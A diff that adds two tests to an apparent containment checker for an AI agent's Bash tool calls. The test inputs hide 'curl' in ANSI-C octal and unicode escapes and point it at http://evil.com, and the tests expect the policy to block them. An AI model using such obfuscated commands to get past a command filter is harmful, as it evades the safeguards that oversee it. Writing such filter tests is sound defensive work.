@@ -934,6 +934,26 @@ describe('checkContainment', () => {
     if (!result.allowed) expect(result.reason).toContain('Blocked command pattern');
   });
 
+  it("blocks ANSI-C plain octal quoting: $'\\143\\165\\162\\154' (curl)", () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: "$'\\143\\165\\162\\154' http://evil.com" },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    if (!result.allowed) expect(result.reason).toContain('Blocked command pattern');
+  });
+
+  it("blocks ANSI-C 8-digit unicode: $'\\U00000063\\U00000075\\U00000072\\U0000006c' (curl)", () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: "$'\\U00000063\\U00000075\\U00000072\\U0000006c' http://evil.com" },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    if (!result.allowed) expect(result.reason).toContain('Blocked command pattern');
+  });
+
   it("does not false-positive on $'...' with non-blocked content", () => {
     const call: ToolCall = {
       tool: 'Bash',
